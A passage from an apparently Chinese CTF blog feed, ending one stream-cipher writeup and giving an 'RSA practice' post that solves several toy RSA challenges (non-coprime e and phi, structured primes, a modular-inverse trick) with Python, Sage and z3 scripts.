class="number">1</span></span><br><span class="line">        buffer = self.state ^ self.C</span><br><span class="line">        self.C &amp;= self.state</span><br><span class="line"></span><br><span class="line">        self.C ^= (buffer &amp; fb)</span><br><span class="line">        buffer ^= fb</span><br><span class="line">        self.state = buffer</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">F</span>(<span class="params">self</span>):</span></span><br><span class="line">        buffer = self.<span class="built_in">filter</span> &amp; self.state</span><br><span class="line">        buffer ^= ((buffer &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        buffer ^= ((buffer &gt;&gt; <span class="number">64</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        buffer ^= ((buffer &gt;&gt; <span class="number">96</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        buffer ^= ((buffer &gt;&gt; <span class="number">128</span>) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        buffer = buffer &amp; <span class="number">0xffffffff</span></span><br><span class="line">        buffer ^= (buffer &gt;&gt; <span class="number">16</span>)</span><br><span class="line">        buffer ^= (buffer &gt;&gt; <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buffer &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, msg</span>):</span></span><br><span class="line">        length = <span class="built_in">len</span>(msg)</span><br><span class="line">        res = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            self.clock()</span><br><span class="line">            res += <span class="built_in">bytes</span>([self.F() ^ msg[i]])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = getrandbits(bits)</span><br><span class="line">iv = getrandbits(bits)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line">ffcsr = Task(key, iv)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">26</span>):</span><br><span class="line">    ffcsr.clock()</span><br><span class="line">    f.write((ffcsr.F().to_bytes(<span class="number">1</span>, <span class="string">&quot;big&quot;</span>)))</span><br><span class="line">f.close()</span><br><span class="line">flag = <span class="string">b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">enc = ffcsr.encrypt(flag)</span><br><span class="line">f.write(enc)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></li><li><p>flag</p></li><li><p>hint</p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>还有一道fcsr（400分，0解）没出也没细研究</p><p>虽然时间上确实有些来不及了，但本质上还是怠惰了、畏难了</p><p>要是别的师傅一看赛题，东北赛区的密码师傅就这？</p><p>可太丢脸了😢</p>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA刷题</title>
      <link href="/2022/07/04/RSA%E5%88%B7%E9%A2%98/"/>
      <url>/2022/07/04/RSA%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="funnyrsa1"><a href="#funnyrsa1" class="headerlink" title="funnyrsa1"></a>funnyrsa1</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e1 = <span class="number">14606334023791426</span></span><br><span class="line">p1 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1 = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1 = <span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">13813369129257838</span></span><br><span class="line">p2 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2 = <span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2 = <span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br></pre></td></tr></table></figure><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><ul><li>gcd(e1, phi) = 14</li><li>e1 | p1 - 1    &amp;    e1 | q1 -  1</li></ul><p>e, phi不互素的第二种情况</p><p>这里头脑风暴一下，就可解决（非预期？</p><ol><li><p>直接对c1在有限域开e1次方，开不出来（e1太大了</p></li><li><p>对c1开14次方，便得到$c_1 ^ \frac{1}{14}$,有：</p><p>$$c_1 ^ \frac{1}{14} = m^ \frac{e1}{14} \mod n$$</p><p>即：$$c1’ = m^{e’} \mod n$$</p><p>此时，e1’ = e1/14, gcd(e1, phi1) = 1</p></li><li><p>e1‘, phi互素了，解出m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">14</span></span><br><span class="line">e1 = <span class="number">14606334023791426</span> // <span class="number">14</span></span><br><span class="line">p = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c = <span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e1, phi)</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^e-c</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^e-c</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q])</span><br><span class="line">        m = <span class="built_in">int</span>(<span class="built_in">pow</span>(<span class="built_in">int</span>(solution), d, p*q))</span><br><span class="line">        flag = libnum.n2s(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Over.&#x27;</span>)</span><br><span class="line"><span class="comment"># b&quot;flag&#123;gcd_e&amp;\xcf\x86_isn&#x27;t_1&#125;&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>对乱码部分hex解码，得：</p><p><code>flag&#123;gcd_e&amp;φ_isn&#39;t_1&#125;</code></p></li></ol><h2 id="ctfshow·EASYRSA"><a href="#ctfshow·EASYRSA" class="headerlink" title="ctfshow·EASYRSA"></a>ctfshow·EASYRSA</h2><blockquote><p>ROARCTF复现</p></blockquote><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag.startwith(<span class="string">&#x27;flag&#123;&#x27;</span>)) <span class="keyword">and</span> (flag.endwith(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span>(is_prime(beta) <span class="keyword">and</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(beta)[<span class="number">2</span>:]) == <span class="number">512</span>) </span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]) == <span class="built_in">len</span>(<span class="built_in">bin</span>(y)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># This is tip!!!</span></span><br><span class="line"><span class="keyword">assert</span>(tip == <span class="number">2</span>*x*y*beta + x + y)</span><br><span class="line"></span><br><span class="line">p = <span class="number">2</span>*x*beta + <span class="number">1</span></span><br><span class="line">q = <span class="number">2</span>*y*beta + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(is_prime(p) <span class="keyword">and</span> is_prime(q))</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">enc = powmod(m,e,n)</span><br><span class="line"><span class="comment">#n=17986052241518124152579698727005505088573670763293762110375836247355612011054569717338676781772224186355540833136105641118789391002684013237464006860953174190278718294774874590936823847040556879723368745745863499521381501281961534965719063185861101706333863256855553691578381034302217163536137697146370869852180388385732050177505306982196493799420954022912860262710497234529008765582379823928557307038782793649826879316617865012433973899266322533955187594070215597700782682186705964842947435512183808651329554499897644733096933800570431036589775974437965028894251544530715336418443795864241340792616415926241778326529055663</span></span><br><span class="line"><span class="comment">#e=65537</span></span><br><span class="line"><span class="comment">#enc=10760807485718247466823893305767047250503197383143218026814141719093776781403513881079114556890534223832352132446445237573389249010880862460738448945011264928270648357652595432015646424427464523486856294998582949173459779764873664665361437483861277508734208729366952221351049574873831620714889674755106545281174797387906705765430764314845841490492038801926675266705606453163826755694482549401843247482172026764635778484644547733877083368527255145572732954216461334217963127783632702980064435718785556011795841651015143521512315148320334442235923393757396733821710592667519724592789856065414299022191871582955584644441117223</span></span><br><span class="line"><span class="comment">#beta=11864389277042761216996641604675717452843530574016671576684180662096506094587545173005905433938758559675517932481818900399893444422743930613073261450555599</span></span><br></pre></td></tr></table></figure><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>我写的颇为费劲，起初想通过n // pow(beta, 2)得到4xy</p><p>再利用%来获得x+y来解方程</p><p>以上都是不可行的，因为通过简单判断，知道p、q都是大于beta的</p><ul><li><p>还得向tip看齐</p></li><li><p>然后根据余数遍历k来爆破x+y，从而得到x*y</p><p>最近做的题居然都偏向于这种易被我忽视的</p></li><li><p>解出x, y</p></li><li><p>发现p、q是素数</p></li><li><p>求解rsa</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">17986052241518124152579698727005505088573670763293762110375836247355612011054569717338676781772224186355540833136105641118789391002684013237464006860953174190278718294774874590936823847040556879723368745745863499521381501281961534965719063185861101706333863256855553691578381034302217163536137697146370869852180388385732050177505306982196493799420954022912860262710497234529008765582379823928557307038782793649826879316617865012433973899266322533955187594070215597700782682186705964842947435512183808651329554499897644733096933800570431036589775974437965028894251544530715336418443795864241340792616415926241778326529055663</span></span><br><span class="line">enc = <span class="number">10760807485718247466823893305767047250503197383143218026814141719093776781403513881079114556890534223832352132446445237573389249010880862460738448945011264928270648357652595432015646424427464523486856294998582949173459779764873664665361437483861277508734208729366952221351049574873831620714889674755106545281174797387906705765430764314845841490492038801926675266705606453163826755694482549401843247482172026764635778484644547733877083368527255145572732954216461334217963127783632702980064435718785556011795841651015143521512315148320334442235923393757396733821710592667519724592789856065414299022191871582955584644441117223</span></span><br><span class="line">beta = <span class="number">11864389277042761216996641604675717452843530574016671576684180662096506094587545173005905433938758559675517932481818900399893444422743930613073261450555599</span></span><br><span class="line">tip = (n - <span class="number">1</span>) // (<span class="number">2</span> * beta)  <span class="comment"># 2xy*beta+x+y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = (x+y) % beta = tip % beta</span></span><br><span class="line"><span class="comment"># x+y = k*beta + a</span></span><br><span class="line">a = tip % beta</span><br><span class="line">x = <span class="number">4668043289052029901343771698523052922596858535604154804368853607181324334964567257637285439401177209511493949633696749298641147411501031244979219281057378320</span></span><br><span class="line">y = <span class="number">6843057810980339658872333593534427464545104752516312442185148369974064674864085821085976673212477585701065946365239235648157162338024362013460418665527344009</span></span><br><span class="line">p = <span class="number">2</span>*x*beta + <span class="number">1</span></span><br><span class="line">q = <span class="number">2</span>*y*beta + <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> gmpy2.is_prime(p)</span><br><span class="line"><span class="keyword">assert</span> gmpy2.is_prime(q)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(enc, d, n))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 求x, y</span></span><br><span class="line"><span class="string">k = 0</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    x_a_y = k*beta + a</span></span><br><span class="line"><span class="string">    print(k)</span></span><br><span class="line"><span class="string">    if (tip-x_a_y) % beta == 0:</span></span><br><span class="line"><span class="string">        xy = (tip-x_a_y) // (2*beta)</span></span><br><span class="line"><span class="string">        x = Int(&#x27;x&#x27;)</span></span><br><span class="line"><span class="string">        y = Int(&#x27;y&#x27;)</span></span><br><span class="line"><span class="string">        S = Solver()</span></span><br><span class="line"><span class="string">        S.add(x+y == x_a_y)</span></span><br><span class="line"><span class="string">        S.add(x*y == xy)</span></span><br><span class="line"><span class="string">        S.add(x &gt; 0, y &gt; 0)</span></span><br><span class="line"><span class="string">        if str(S.check()) == &#x27;sat&#x27;:</span></span><br><span class="line"><span class="string">            print(S.model())</span></span><br><span class="line"><span class="string">    k += 1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="ctfshow大🐮杯·小二难度R54"><a href="#ctfshow大🐮杯·小二难度R54" class="headerlink" title="ctfshow大🐮杯·小二难度R54"></a>ctfshow大🐮杯·小二难度R54</h2><p>刷知乎刷到的题🤔，la佬出的签到题</p><p>做的<strong>破为曲折</strong>，记录一下</p><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">x</span><span class="punctuation">,</span> y <span class="operator">=</span> [random_prime(<span class="number">2</span> ^ <span class="number">1024</span> - <span class="number">1</span><span class="punctuation">,</span> False<span class="punctuation">,</span> <span class="number">2</span> ^ <span class="number">1023</span>) for _ in range(<span class="number">2</span>)]</span><br><span class="line"># <span class="keyword">x</span> * y<span class="punctuation">,</span> pow(<span class="number">2021</span> * <span class="keyword">x</span> + <span class="number">501</span> * y<span class="punctuation">,</span> <span class="keyword">x</span> * y - <span class="keyword">x</span> - y<span class="punctuation">,</span> <span class="keyword">x</span> * y)<span class="punctuation">,</span> pow(flag<span class="punctuation">,</span> <span class="number">0</span>o<span class="number">200001</span><span class="punctuation">,</span> <span class="keyword">x</span> * y)</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">20947495659013288660808536751393787394664606045798093048128257278988208709333248671898749660848208653968668634891579612784633367362177864996602736258460476691940723323282467207875842974409286563660436709535601954405015261428106261369927836045794170912665351432105165546188591486357060490032334793140396757102052999128194027485573053073959574695808224922102635888141991154365047911830780778957642166757152369955362399379720841279167832886144458760347392316082994786119404006382441787685301119197529946566027319295285387108473752590621030421978808950305190250697199878929419723511578437404000924310974770501204226510397</span>, <span class="number">12911378830212711575909332427930495830030418987483519620282504671823307660633472092466534392403086505995560725428252134905285658936113891795434303336259751169171583600394870893708505805256284455729584616439559184469715186920464999723861722097244025658190194027561300165723184060071016117033960821040587421503448139025974851980482004179865110864844573575034406782936965166402665401330436229441569042660851847498727291447251591027480750458209012729510702196684303778564353025395186191064801000127420683298000173389589468742142444444759536629401472836827952997758216526858512433131954439154124668711408079361172485321041</span>, <span class="number">13390681135321846035598057088735733735860895610541899486616159864716324918810264721878447895634342127744578566110322466944217562868186608760962032192994397783118528288276520451944892998435079744244578731427626946331165523865930693902700790185275273534104979885060728696532991031786741950704918951536399577118136416956670893081637730646528913282395731901667720418372650030593319596584787752412110672058692368924987360383096340538971725402687347195347344826404005229912821371282465882351660619944919637382790572267512735645269618163597227604601321699186335016345484182059187046972681187078878556533926780789183784240737</span>]</span><br></pre></td></tr></table></figure><h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>可见 把x、y当作p、q,则有：</p><ul><li>p、q  is prime</li><li>给了一下值<ul><li>p*q   即n</li><li>$(2021•p+501•q)^{pq-p-q} \mod n$</li><li>$c = flag^e \mod n$</li><li>e = 0o200001  (十六进制下的65537)</li></ul></li></ul><p>一开始觉得怪复杂的，后然看到幂pq-p-q，想到的有威尔逊定理和欧拉定理，显然后者可能有效</p><p>于是观察到$(p-1)*(q-1) = pq-p-q+1$</p><p>尝试构造之，设$A = (2021•p+501•q)$，$tmp = (2021•p+501•q)^{pq-p-q} \mod n$则：</p><p>$tmp*A = A^{\phi (n)} \mod n = 1 \mod n$</p><p>我是很不情愿尝试拆开来直接爆破的，但前几次做题都有这操作，这里也情不自禁想：</p><p>$tmp•A = k•n +1$, 所以遍历k使得kn+1能被tmp整除，则爆破出A</p><p>然后用z3解方程得到p、q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n, tmp, c = ...</span><br><span class="line">S = Solver()</span><br><span class="line"></span><br><span class="line">e = <span class="number">0o200001</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(k)</span><br><span class="line">    <span class="keyword">if</span> (k*n + <span class="number">1</span>) % tmp == <span class="number">0</span>:</span><br><span class="line">        a = (k*n + <span class="number">1</span>) // tmp</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        p = Int(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        q = Int(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">        S.add(q &gt; <span class="number">0</span>)</span><br><span class="line">        S.add(p &gt; <span class="number">0</span>)</span><br><span class="line">        S.add(<span class="number">2021</span>*p + <span class="number">501</span>*q == a)</span><br><span class="line">        <span class="keyword">if</span> S.check():</span><br><span class="line">            <span class="built_in">print</span>(S.model())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>实际跑起来，几分钟都没结果，作罢</p><p><strong>然后再仔细观察👀</strong></p><p>$tmp*A = 1 \mod n$</p><p>🤔啊这，逆元嘛，这不是</p><p>易得：<strong>A = inv(tmp, n)</strong></p><p>于是，觉得万事大吉！</p><p>(其实题目里<code>random_prime(2 ^ 1024 - 1, False, 2 ^ 1023)</code>没看懂，猜测生成素数是小于2\^1024-1，大于2\^1023的)</p><p>上z3</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">from z3 import<span class="operator"> *</span></span><br><span class="line"><span class="operator"></span></span><br><span class="line"><span class="operator"></span>n, tmp, c = <span class="number">20947495659013288660808536751393787394664606045798093048128257278988208709333248671898749660848208653968668634891579612784633367362177864996602736258460476691940723323282467207875842974409286563660436709535601954405015261428106261369927836045794170912665351432105165546188591486357060490032334793140396757102052999128194027485573053073959574695808224922102635888141991154365047911830780778957642166757152369955362399379720841279167832886144458760347392316082994786119404006382441787685301119197529946566027319295285387108473752590621030421978808950305190250697199878929419723511578437404000924310974770501204226510397</span>, <span class="number">12911378830212711575909332427930495830030418987483519620282504671823307660633472092466534392403086505995560725428252134905285658936113891795434303336259751169171583600394870893708505805256284455729584616439559184469715186920464999723861722097244025658190194027561300165723184060071016117033960821040587421503448139025974851980482004179865110864844573575034406782936965166402665401330436229441569042660851847498727291447251591027480750458209012729510702196684303778564353025395186191064801000127420683298000173389589468742142444444759536629401472836827952997758216526858512433131954439154124668711408079361172485321041</span>, <span class="number">13390681135321846035598057088735733735860895610541899486616159864716324918810264721878447895634342127744578566110322466944217562868186608760962032192994397783118528288276520451944892998435079744244578731427626946331165523865930693902700790185275273534104979885060728696532991031786741950704918951536399577118136416956670893081637730646528913282395731901667720418372650030593319596584787752412110672058692368924987360383096340538971725402687347195347344826404005229912821371282465882351660619944919637382790572267512735645269618163597227604601321699186335016345484182059187046972681187078878556533926780789183784240737</span></span><br><span class="line">S = <span class="constructor">Solver()</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0o200001</span></span><br><span class="line">A = <span class="built_in">int</span>(gmpy2.invert(tmp, n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="constructor">Int(&#x27;<span class="params">p</span>&#x27;)</span></span><br><span class="line">q = <span class="constructor">Int(&#x27;<span class="params">q</span>&#x27;)</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">S</span>.</span></span>add(q &gt; <span class="number">2</span>**<span class="number">1023</span>)</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">S</span>.</span></span>add(q &lt; <span class="number">2</span>*<span class="number">1024</span>-<span class="number">1</span>)</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">S</span>.</span></span>add((p &gt; <span class="number">2</span>**<span class="number">1023</span>))</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">S</span>.</span></span>add(p &lt; <span class="number">2</span>*<span class="number">1024</span>-<span class="number">1</span>)</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">S</span>.</span></span>add((<span class="number">2021</span>*p + <span class="number">501</span>*q) % n<span class="operator"> == </span>A)</span><br><span class="line"><span class="keyword">if</span> <span class="module-access"><span class="module"><span class="identifier">S</span>.</span></span>check<span class="literal">()</span>:</span><br><span class="line">    print(<span class="module-access"><span class="module"><span class="identifier">S</span>.</span></span>model<span class="literal">()</span>)</span><br><span class="line">    print(<span class="module-access"><span class="module"><span class="identifier">S</span>.</span></span>model<span class="literal">()</span><span class="literal">[<span class="number">0</span>]</span>)</span><br><span class="line">    print(<span class="keyword">type</span>(<span class="module-access"><span class="module"><span class="identifier">S</span>.</span></span>model<span class="literal">()</span>))</span><br><span class="line"></span><br><span class="line">q =<span class="operator"> ...</span></span><br><span class="line"><span class="operator"></span>p =<span class="operator"> ...</span></span><br><span class="line"><span class="operator"></span>phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">int</span>(pow(c, d, n))</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><p><code>S.add(q &lt; 2*1024-1)</code>、<code>S.add(p &lt; 